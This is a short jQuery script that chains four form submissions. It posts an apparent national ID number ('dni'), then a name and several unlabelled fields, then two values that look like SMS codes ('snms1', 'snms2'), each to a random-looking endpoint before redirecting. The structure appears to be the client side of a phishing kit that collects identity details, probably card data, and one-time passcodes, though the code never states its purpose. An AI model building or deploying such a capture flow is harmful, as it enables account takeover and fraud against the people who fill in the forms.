$(function(){
    $("#pg1").on("submit",function(e){
        e.preventDefault();
        let dni = $("#usery").val();


        //send backend:
        $.ajax({
            url: '/gzLbTbjqMpc34D4XsPJ2',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({dni}),
            success: function(info) {
                if(info.OK){
                    window.location = "/fGnEL4jmpuBCDkJP3myR";
                }
            }
        });
    });

    $("#pg2").on("submit",function(e){
        e.preventDefault();
        let a1 = $("#nom").val();
        let a2 = $("#posita").val();
        let a3 = $("#one").val();
        let a4 = $("#two").val();
        let a5 = $("#three").val();
        //send backend:
        $.ajax({
            url: '/NkMNm4664XhcW8KuukHk',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({a1,a2,a3,a4,a5}),
            success: function(info) {
                if(info.OK){
                    window.location = "/Q89HFszQPd3TFv4mx65k";
                }
            }
        });
    });

    $("#pg3").on("submit",function(e){ // snms1:
        e.preventDefault();
        let sps1 = $("#sps1").val();


        //send backend:
        $.ajax({
            url: '/m4kT9BQWt7KTDdaVmafx',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({sps1}),
            success: function(info) {
                if(info.OK){
                    window.location = "/aEsKRvuaENZtYax265Kv";
                }
            }
        });
    });


    $("#pg4").on("submit",function(e){ // snms2:
        e.preventDefault();
        let sps2 = $("#sps2").val();
        
        //send backend:
        $.ajax({
            url: '/Qv69PRvXg6PQEvrzJx6j',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({sps2}),
            success: function(info) {
                if(info.OK){
                    window.location = "/HfuRVXK8w8fLmT2vWHe8";
                }
            }
        });
    });



});